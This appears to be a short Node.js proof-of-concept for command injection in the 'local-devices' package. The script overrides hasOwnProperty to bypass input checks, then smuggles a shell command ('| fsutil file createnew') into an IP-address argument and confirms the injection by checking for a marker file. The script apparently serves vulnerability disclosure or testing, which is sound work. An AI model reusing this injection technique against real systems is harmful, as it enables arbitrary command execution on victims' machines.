Object.prototype.hasOwnProperty.call = () => true;
const find = require('local-devices');
const fs = require('fs');
const path = './local-devices';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let userInput = '127.0.0.1 | fsutil file createnew local-devices 0';
console.log(find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));